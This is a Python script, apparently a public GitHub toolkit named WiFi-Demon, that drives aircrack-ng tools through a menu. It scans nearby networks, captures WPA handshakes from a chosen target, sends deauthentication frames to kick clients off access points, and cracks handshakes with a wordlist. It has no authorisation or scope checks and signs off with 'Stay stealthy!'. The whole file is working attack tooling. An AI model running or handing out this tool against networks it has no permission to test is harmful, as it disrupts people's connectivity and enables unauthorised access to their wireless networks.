#!/usr/bin/env python3
"""
WiFi-Demon v1.0
A comprehensive WiFi penetration testing toolkit
Author: n0merc
GitHub: https://github.com/n0merc/wifi-demon
"""

import os
import sys
import time
import subprocess
import threading
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ASCII Art Logo
LOGO = f"""
{Fore.RED}
██╗    ██╗██╗███████╗██╗     
██║    ██║██║██╔════╝██║     
██║ █╗ ██║██║█████╗  ██║     
██║███╗██║██║██╔══╝  ██║          
╚███╔███╔╝██║██║     ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
{Fore.YELLOW}
██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║
██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║
██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
{Fore.CYAN}
                Created by n0merc
        https://github.com/n0merc/wifi-demon
{Style.RESET_ALL}
"""

def clear_screen():
    """Clear the terminal screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

def check_root():
    """Check if running as root"""
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] This tool requires root privileges!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Run: sudo python3 wifi_demon.py{Style.RESET_ALL}")
        sys.exit(1)

def get_wifi_interfaces():
    """Get available WiFi interfaces"""
    interfaces = []
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True, shell=True)
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                iface = line.split()[0]
                interfaces.append(iface)
    except:
        pass
    
    if not interfaces:
        interfaces = ['wlan0', 'wlan1', 'wlan2']
    
    return interfaces

def scan_wifi_networks(interface):
    """Scan for WiFi networks"""
    print(f"{Fore.CYAN}[*] Scanning for networks on {interface}...{Style.RESET_ALL}")
    
    # Put interface in monitor mode
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)
    subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL)
    
    monitor_iface = f"{interface}mon"
    
    # Start scanning
    print(f"{Fore.YELLOW}[*] Starting scan (Ctrl+C to stop)...{Style.RESET_ALL}")
    try:
        scan_proc = subprocess.Popen(['airodump-ng', monitor_iface, '--write', 'scan_results', 
                                      '--output-format', 'csv'], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(10)
        scan_proc.terminate()
        
        # Parse results
        if os.path.exists('scan_results-01.csv'):
            with open('scan_results-01.csv', 'r') as f:
                lines = f.readlines()
            
            print(f"\n{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Available Networks:{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
            
            networks = []
            for line in lines:
                if 'Station' in line:
                    break
                parts = line.split(',')
                if len(parts) > 13 and parts[0].strip():
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    encryption = parts[5].strip()
                    essid = parts[13].strip()
                    
                    if essid and bssid != 'BSSID':
                        networks.append({
                            'BSSID': bssid,
                            'CH': channel,
                            'ENC': encryption,
                            'ESSID': essid
                        })
            
            for i, net in enumerate(networks, 1):
                print(f"{Fore.CYAN}[{i}] {Fore.WHITE}{net['ESSID']:<20} {Fore.YELLOW}BSSID: {net['BSSID']:<17} {Fore.GREEN}CH: {net['CH']:<3} {Fore.RED}ENC: {net['ENC']}{Style.RESET_ALL}")
            
            print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
            
            # Cleanup
            os.system('rm -f scan_results*')
            
            return networks
        else:
            print(f"{Fore.RED}[!] No networks found!{Style.RESET_ALL}")
            return []
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Scan stopped by user{Style.RESET_ALL}")
        os.system('rm -f scan_results*')
        return []
    finally:
        # Stop monitor mode
        subprocess.run(['airmon-ng', 'stop', monitor_iface], stdout=subprocess.DEVNULL)

def capture_handshake(interface, bssid, channel, essid):
    """Capture WPA handshake"""
    print(f"{Fore.CYAN}[*] Targeting: {essid} ({bssid}) on channel {channel}{Style.RESET_ALL}")
    
    monitor_iface = f"{interface}mon"
    
    # Start capture
    print(f"{Fore.YELLOW}[*] Starting handshake capture...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] You may need to deauthenticate clients (option 4){Style.RESET_ALL}")
    
    capture_file = f"handshake_{essid.replace(' ', '_')}"
    
    capture_cmd = [
        'airodump-ng',
        '--bssid', bssid,
        '--channel', channel,
        '--write', capture_file,
        monitor_iface
    ]
    
    capture_proc = subprocess.Popen(capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"{Fore.GREEN}[+] Capture running in background (PID: {capture_proc.pid}){Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Capture file: {capture_file}-01.cap{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Press Enter to stop capture...{Style.RESET_ALL}")
    input()
    
    capture_proc.terminate()
    print(f"{Fore.GREEN}[+] Handshake capture stopped{Style.RESET_ALL}")
    
    # Check for handshake
    if os.path.exists(f"{capture_file}-01.cap"):
        print(f"{Fore.GREEN}[+] Capture file saved: {capture_file}-01.cap{Style.RESET_ALL}")
        return f"{capture_file}-01.cap"
    else:
        print(f"{Fore.RED}[!] No capture file created{Style.RESET_ALL}")
        return None

def deauth_attack(interface, bssid, client=None):
    """Perform deauthentication attack"""
    print(f"{Fore.RED}[!] Starting deauthentication attack on {bssid}{Style.RESET_ALL}")
    
    monitor_iface = f"{interface}mon"
    
    deauth_cmd = ['aireplay-ng', '--deauth', '10', '-a', bssid]
    
    if client:
        deauth_cmd.extend(['-c', client])
        print(f"{Fore.YELLOW}[*] Targeting client: {client}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[*] Targeting all clients{Style.RESET_ALL}")
    
    deauth_cmd.append(monitor_iface)
    
    try:
        subprocess.run(deauth_cmd)
        print(f"{Fore.GREEN}[+] Deauthentication attack completed{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Attack stopped by user{Style.RESET_ALL}")

def crack_handshake(cap_file, wordlist=None):
    """Crack WPA handshake"""
    if not wordlist:
        wordlist = '/usr/share/wordlists/rockyou.txt'
    
    if not os.path.exists(wordlist):
        print(f"{Fore.RED}[!] Wordlist not found: {wordlist}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using default small wordlist{Style.RESET_ALL}")
        # Create a small test wordlist
        with open('test_wordlist.txt', 'w') as f:
            f.write('password\n123456\nadmin\nwifi\n12345678\n')
        wordlist = 'test_wordlist.txt'
    
    print(f"{Fore.CYAN}[*] Attempting to crack handshake with {wordlist}{Style.RESET_ALL}")
    
    crack_cmd = ['aircrack-ng', cap_file, '-w', wordlist]
    
    try:
        subprocess.run(crack_cmd)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Cracking stopped by user{Style.RESET_ALL}")

def show_interface_info():
    """Show network interface information"""
    print(f"{Fore.CYAN}[*] Network Interfaces:{Style.RESET_ALL}")
    subprocess.run(['ifconfig', '-a'])
    print(f"\n{Fore.CYAN}[*] WiFi Interfaces:{Style.RESET_ALL}")
    subprocess.run(['iwconfig'])

def main_menu():
    """Display main menu"""
    clear_screen()
    print(LOGO)
    
    interfaces = get_wifi_interfaces()
    
    print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[1] Scan WiFi Networks")
    print(f"{Fore.CYAN}[2] Capture WPA Handshake")
    print(f"{Fore.CYAN}[3] Crack Handshake")
    print(f"{Fore.CYAN}[4] Deauthentication Attack")
    print(f"{Fore.CYAN}[5] Show Interface Info")
    print(f"{Fore.CYAN}[6] Exit")
    print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
    
    if interfaces:
        print(f"{Fore.YELLOW}[*] Available interfaces: {', '.join(interfaces)}{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.RED}WiFi-Demon{Fore.WHITE}@{Fore.GREEN}n0merc{Fore.WHITE}:~# {Style.RESET_ALL}")
    return choice

def main():
    """Main function"""
    check_root()
    
    current_interface = None
    current_network = None
    handshake_file = None
    
    while True:
        choice = main_menu()
        
        if choice == '1':
            interfaces = get_wifi_interfaces()
            if interfaces:
                print(f"\n{Fore.YELLOW}[*] Select interface:{Style.RESET_ALL}")
                for i, iface in enumerate(interfaces, 1):
                    print(f"{Fore.CYAN}[{i}] {iface}{Style.RESET_ALL}")
                
                iface_choice = input(f"\n{Fore.YELLOW}[?] Enter choice (1-{len(interfaces)}): {Style.RESET_ALL}")
                try:
                    idx = int(iface_choice) - 1
                    if 0 <= idx < len(interfaces):
                        current_interface = interfaces[idx]
                        networks = scan_wifi_networks(current_interface)
                        
                        if networks:
                            net_choice = input(f"\n{Fore.YELLOW}[?] Select network to target (1-{len(networks)}): {Style.RESET_ALL}")
                            try:
                                net_idx = int(net_choice) - 1
                                if 0 <= net_idx < len(networks):
                                    current_network = networks[net_idx]
                                    print(f"{Fore.GREEN}[+] Selected: {current_network['ESSID']}{Style.RESET_ALL}")
                            except:
                                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[!] Invalid interface selection{Style.RESET_ALL}")
                except:
                    print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] No WiFi interfaces found!{Style.RESET_ALL}")
        
        elif choice == '2':
            if not current_interface:
                print(f"{Fore.RED}[!] No interface selected! Run scan first.{Style.RESET_ALL}")
                time.sleep(2)
                continue
            
            if not current_network:
                print(f"{Fore.RED}[!] No network selected! Run scan first.{Style.RESET_ALL}")
                time.sleep(2)
                continue
            
            handshake_file = capture_handshake(
                current_interface,
                current_network['BSSID'],
                current_network['CH'],
                current_network['ESSID']
            )
        
        elif choice == '3':
            if not handshake_file:
                cap_file = input(f"{Fore.YELLOW}[?] Enter handshake file path: {Style.RESET_ALL}")
                if os.path.exists(cap_file):
                    handshake_file = cap_file
                else:
                    print(f"{Fore.RED}[!] File not found!{Style.RESET_ALL}")
                    continue
            
            wordlist = input(f"{Fore.YELLOW}[?] Enter wordlist path (Enter for default): {Style.RESET_ALL}")
            if not wordlist.strip():
                wordlist = None
            
            crack_handshake(handshake_file, wordlist)
        
        elif choice == '4':
            if not current_interface:
                print(f"{Fore.RED}[!] No interface selected!{Style.RESET_ALL}")
                time.sleep(2)
                continue
            
            if not current_network:
                bssid = input(f"{Fore.YELLOW}[?] Enter target BSSID: {Style.RESET_ALL}")
                if not bssid:
                    print(f"{Fore.RED}[!] BSSID required!{Style.RESET_ALL}")
                    continue
                current_network = {'BSSID': bssid}
            
            client = input(f"{Fore.YELLOW}[?] Enter client MAC (Enter for broadcast): {Style.RESET_ALL}")
            if not client.strip():
                client = None
            
            deauth_attack(current_interface, current_network['BSSID'], client)
        
        elif choice == '5':
            show_interface_info()
            input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Style.RESET_ALL}")
        
        elif choice == '6':
            print(f"\n{Fore.RED}[!] Exiting WiFi-Demon... Stay stealthy!{Style.RESET_ALL}")
            # Cleanup
            subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)
            sys.exit(0)
        
        else:
            print(f"{Fore.RED}[!] Invalid choice!{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Tool terminated by user{Style.RESET_ALL}")
        # Cleanup
        subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)
        sys.exit(0)
